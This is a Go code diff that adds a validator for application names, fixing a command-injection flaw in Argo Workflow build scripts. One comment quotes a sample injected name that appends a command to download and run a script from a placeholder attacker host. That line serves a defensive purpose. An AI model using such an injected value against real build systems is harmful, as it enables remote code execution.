@@ -14,6 +14,12 @@ import (
 // No shell metacharacters, no null bytes, no spaces.
 var appPathRegex = regexp.MustCompile(`^[a-zA-Z0-9._/-]+$`)
 
+// appNameRegex allows lowercase alphanumeric and hyphens, starting with a letter.
+// Matches RFC 1123 label names — same rule used for K8s namespace/service names.
+// CODE-001 fix: app.Name flows into shell scripts in Argo Workflow build steps.
+// Without validation, shell metacharacters enable command injection.
+var appNameRegex = regexp.MustCompile(`^[a-z][a-z0-9-]{0,62}$`)
+
 const maxAppPathLength = 255
 
 // ValidateAppPath checks that an app path is safe for use in shell scripts and filesystem operations.
@@ -57,6 +63,36 @@ func ValidateAppPath(path string) error {
 	// Reject trailing slash (likely a mistake)
 	if strings.HasSuffix(path, "/") {
 		return fmt.Errorf("app path must not end with '/': %q", path)
+	}
+
+	return nil
+}
+
+// ValidateAppName checks that an app name is safe for use in shell scripts,
+// Kubernetes resource names, and container image tags.
+//
+// CODE-001 fix: app.Name flows into Argo Workflow shell scripts via
+// loopzeroPacksDockerfileStep() and buildctl arguments. Without validation,
+// a malicious app name like "foo; curl attacker.com | sh" enables RCE
+// in the build cluster.
+//
+// Rules:
+//   - Must start with a lowercase letter
+//   - May contain lowercase alphanumeric characters and hyphens
+//   - Max 63 characters (RFC 1123 label)
+//   - Must not be empty
+func ValidateAppName(name string) error {
+	if name == "" {
+		return fmt.Errorf("app name must not be empty")
+	}
+
+	if !appNameRegex.MatchString(name) {
+		return fmt.Errorf("app name must match RFC 1123 (lowercase alphanumeric and hyphens, start with letter, max 63 chars): %q", name)
+	}
+
+	// Reject names that are only hyphens
+	if strings.Trim(name, "-") == "" {
+		return fmt.Errorf("app name must contain at least one alphanumeric character: %q", name)
 	}
 
 	return nil
